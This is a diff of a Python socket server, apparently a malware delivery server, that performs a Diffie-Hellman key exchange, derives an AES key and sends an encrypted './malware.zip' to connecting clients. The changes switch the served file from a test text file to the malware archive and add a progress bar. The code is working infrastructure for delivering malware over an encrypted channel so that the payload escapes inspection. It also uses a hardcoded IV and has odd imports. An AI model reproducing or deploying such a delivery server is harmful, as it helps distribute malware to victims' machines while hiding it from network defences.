@@ -1,6 +1,9 @@
 import os
 import random
 import socket
+
+import tqdm as tqdm
+from pyparsing import unicode
 from sympy import *
 import json
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
@@ -16,6 +19,10 @@ AES_KEY_LENGTH = 256
 BLOCKS_LENGTH = 16
 IV = b'9\x97\x8fb\xa0\x82\xe1?\xadb\x89\x11,\xcc\xff\t'
 
+MALWARE_PATH = "./malware.zip"
+MIN_DATA_SIZE = 1024
+FILE_SIZE = os.path.getsize(MALWARE_PATH)
+
 
 def generate_key_pair():
     g = 5
@@ -30,20 +37,13 @@ def generate_key_pair():
     return p, g, a, y
 
 
-def generate_secret(p, g, x, y_client):
-    s = (y_client ** x) % p
-    return s
-
-
 def pad_data(data):
-    string_data = data.decode('utf-8')
-    padded_data = string_data + (BLOCKS_LENGTH - len(string_data) % BLOCKS_LENGTH) * \
-        chr(BLOCKS_LENGTH - len(string_data) % BLOCKS_LENGTH)
-    return bytes(padded_data, encoding='utf-8')
+    return data + (BLOCKS_LENGTH - len(data) % BLOCKS_LENGTH) * \
+                  bytes(chr(BLOCKS_LENGTH - len(data) % BLOCKS_LENGTH), encoding="utf-8")
 
 
 def unpad_data(data):
-    return data[:-ord(data[len(data)-1:])]
+    return data[:-ord(data[len(data) - 1:])]
 
 
 def calculate_dh_key(base, secret, mod_prime):
@@ -53,18 +53,18 @@ def calculate_dh_key(base, secret, mod_prime):
 def calculate_aes_key(dh_key):
     key = b""
     return pbkdf2.pbkdf2(hashlib.sha256, key.fromhex(dh_key), SALT, 480000, 32)
-    
+
 
 def fetch_malware():
-    exe_path = ".\\tanuki_the_server\\test_file.txt"
-    #exe_path = ".\\tanuki_the_server\\malware.zip"
+    exe_path = MALWARE_PATH
+    # exe_path = ".\\tanuki_the_server\\malware.zip"
     with open(exe_path, 'rb') as f:
         binary_data = f.read()
         return binary_data
 
 
 def split_data_for_buffer(data, buffer_size):
-    return [data[i:i+buffer_size] for i in range(0, len(data), buffer_size)]
+    return [data[i:i + buffer_size] for i in range(0, len(data), buffer_size)]
 
 
 def string_to_byte_array(hex_str):
@@ -74,12 +74,11 @@ def string_to_byte_array(hex_str):
         for i in range(0, num_chars, 2):
             bytes[i // 2] = int(hex_str[i:i + 2], 16)
             print("Byte written:", bytes[i // 2])
-        
+
         return bytes
     except Exception as ex:
         print("StringToByteArray error:", ex)
         return None
-
 
 
 def start_server():
@@ -108,7 +107,8 @@ def start_server():
             if operation == "keyExchangeGen":
                 print(f"Received request for encrypted communication")
                 dh_prime, g, dh_secret, y = generate_key_pair()
-                response = {"Operation": "keyExchange", "Prime": str(dh_prime), "Generator": str(g), "Gx_server": str(y)}
+                response = {"Operation": "keyExchange", "Prime": str(dh_prime), "Generator": str(g),
+                            "Gx_server": str(y)}
                 print("Sending params for key generation")
                 client_socket.sendall(bytes(json.dumps(response), encoding="utf-8"))
             elif operation == "keyExchangeAns":
@@ -119,10 +119,10 @@ def start_server():
                     dh_key_hex = dh_key_hex + "0"
                 print("dh key int: " + str(dh_key))
                 print("dh key hex: " + dh_key_hex)
-                
+
                 aes_key = calculate_aes_key(dh_key_hex)
                 print(f"Computed AES key: {aes_key.hex()}")
-                
+
                 cipher = Cipher(algorithms.AES(aes_key), modes.CBC(IV))
                 encryptor = cipher.encryptor()
 
@@ -131,10 +131,12 @@ def start_server():
 
                 split_data = split_data_for_buffer(cipher_text, MAX_BUFFER_SIZE)
 
+                progress = tqdm.tqdm(range(FILE_SIZE), f"Sending {MALWARE_PATH}", unit="B", unit_scale=True, unit_divisor=FILE_SIZE / 100)
+
                 print("Sending encrypted executable")
                 for data in split_data:
-                    print(data)
                     client_socket.sendall(data)
+                    progress.update(len(data))
 
                 client_socket.close()
                 break
